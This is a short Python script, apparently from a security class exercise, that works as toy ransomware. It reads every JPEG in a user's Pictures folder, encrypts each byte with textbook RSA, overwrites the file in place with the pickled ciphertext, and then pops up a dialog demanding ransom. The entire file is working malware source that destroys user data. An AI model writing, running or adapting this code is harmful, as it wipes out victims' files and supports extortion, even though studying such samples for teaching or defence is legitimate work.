#!/usr/bin/env python3

import os, pickle, subprocess

n = int(22291846172619859445381409012451)
e = int(65535)

directory = r'/home/csc2021/Pictures'
#directory = r'/home/user/Pictures'

for filename in os.listdir(directory):
    if filename.endswith(".jpg"):
        filepath = os.path.join(directory, filename)
        plain_bytes = b''
        with open(filepath, 'rb') as file:
            plain_bytes = file.read()
        # jpg header syntax
        if((len(plain_bytes) > 2 and plain_bytes[0] == 0xFF and plain_bytes[1] == 0xD8 and plain_bytes[2] == 0xFF)):
            cipher_int = [pow(i, e, n) for i in plain_bytes]
            with open(filepath, 'wb') as file:
                pickle.dump(cipher_int, file)

subprocess.call("zenity --error --text=\"Give me ransom haha\" --title=\"Error\"", shell = True)